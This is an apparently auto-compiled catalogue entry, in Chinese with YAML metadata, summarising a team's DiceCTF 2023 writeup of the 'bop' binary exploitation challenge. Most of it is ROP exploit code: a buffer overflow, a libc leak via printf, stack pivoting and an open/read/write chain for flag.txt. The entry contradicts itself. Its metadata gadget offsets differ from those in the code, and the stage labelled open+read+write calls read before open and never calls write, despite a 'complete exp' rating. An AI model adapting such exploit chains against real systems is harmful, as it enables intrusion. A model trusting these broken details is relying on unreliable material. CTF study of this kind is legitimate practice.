---
title: DiceCTF 2023 Writeup by r3kapig
contest: DiceCTF 2023
year: 2023
difficulty: hard
vuln_type: rop
tags: [pwn, bop, ret2libc, orw, open-read-write, leave-ret, printf-leak, gets]
attack_chain:
  - bop: 32字节溢出+ret2libc+ORW
  - 阶段1: printf泄露libc+gets写入bss
  - 阶段2: open(flag.txt, 0) + read(3, 0x404300, 0x100) + write(1, 0x404300, 0x100)
  - libc gadgets: pop_rdi 0x2a1f5 pop_rsi 0x2601f pop_rdx 0x142c92
  - syscall 0x25EE2
  - read 0x10dfc0
  - puts.got 0x404090
key_payload: pay = b'a'*32 + p64(0x404120-0x8) + pop_rdi + 0x404090 + printf + pop_rdi + 0x404100 + gets + leave_ret
one_liner: DiceCTF 2023 bop：ret2libc+ORW（open+read+write）flag.txt
lesson: 32字节溢出+leave_ret栈迁移实现 ORW 三件套
quality: high
---

# DiceCTF 2023 Writeup by r3kapig

## 题目信息
- 比赛：DiceCTF 2023
- 战队：r3kapig
- 题目：bop（PWN）

## 关键攻击链
### 阶段 1：泄露 libc + 写入 bss
```python
pay = b'a'*32 + p64(0x404120-0x8)
pay += p64(0x00000000004013d3+1)  # ret
pay += p64(0x00000000004013d3)    # pop_rdi
pay += p64(0x404090)               # puts.got
pay += p64(0x4010F0)               # printf
pay += p64(0x00000000004013d3)    # pop_rdi
pay += p64(0x404100)               # bss
pay += p64(0x401100)               # gets
pay += p64(0x401364)               # leave_ret

p.sendline(pay)
libc_base = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x1ec980
```

### 阶段 2：open + read + write
```python
pay = b'flag.txt'.ljust(32, b'\x00')
pay += p64(0x00000000004013d3)    # pop_rdi
pay += p64(0x0)
pay += p64(libc_base+0x000000000002601f)  # pop_rsi
pay += p64(libc_base - 0x2898)    # /flag.txt 字符串
pay += p64(libc_base+0x0000000000142c92)  # pop_rdx
pay += p64(0x8)
pay += p64(libc_base+0x10dfc0)    # read
pay += p64(0x00000000004013d3)    # pop_rdi
pay += p64(0x404100)
pay += p64(libc_base+0x000000000002601f)  # pop_rsi
pay += p64(0x0)
pay += p64(libc_base+0x0000000000036174)  # pop_rax
pay += p64(0x2)                    # open
pay += p64(libc_base+0x000000000007f1d2)
pay += p64(libc_base+0x25EE2)      # syscall
```

## 评分
- quality: high（ret2libc + ORW 完整 exp + libc gadget 偏移）
